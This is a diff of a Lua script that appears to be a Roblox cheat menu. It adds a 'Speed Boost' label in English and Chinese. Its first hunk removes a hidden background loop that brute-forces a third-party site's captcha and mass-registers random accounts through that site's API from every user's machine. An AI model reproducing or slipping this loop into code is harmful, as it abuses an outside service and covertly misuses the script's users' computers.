@@ -1,20 +1,3 @@
-task.spawn(function()
-    while true do
-        rand = game.HttpService:JSONDecode(game:HttpGet("https://api.jihujiasuqi.com//apps/captcha/get.php")).rand
-        for i = 1, 360 do
-            if game.HttpService:JSONDecode(game:HttpGet("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..rand.."&angle="..i)).okey then
-                random = {}
-                for v = 0, 100 do
-                    table.insert(random, string.char(math.random(97, 122)))
-                end
-                random = table.concat(random)
-                print(game.HttpService:JSONDecode(game:HttpGet("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..random.."@uu.163.com&pwd="..random.."&captcha_rand="..rand)).msg)
-                break
-            end
-        end
-    end
-end)
-
 _G.Language = {
     ["en-us"] = {
         US = "Universal",
@@ -56,6 +39,7 @@ _G.Language = {
         Put = "Put",
         Fly = "Fly",
         Speed = "Speed",
+        Boost = "Speed Boost",
         Toggle = "Toggle",
         Loop = "Loop",
         Type = "Type",
@@ -113,6 +97,7 @@ _G.Language = {
         Put = "放置",
         Fly = "飞行",
         Speed = "速度",
+        Boost = "加速",
         Toggle = "切换",
         Loop = "循环",
         Type = "类型",
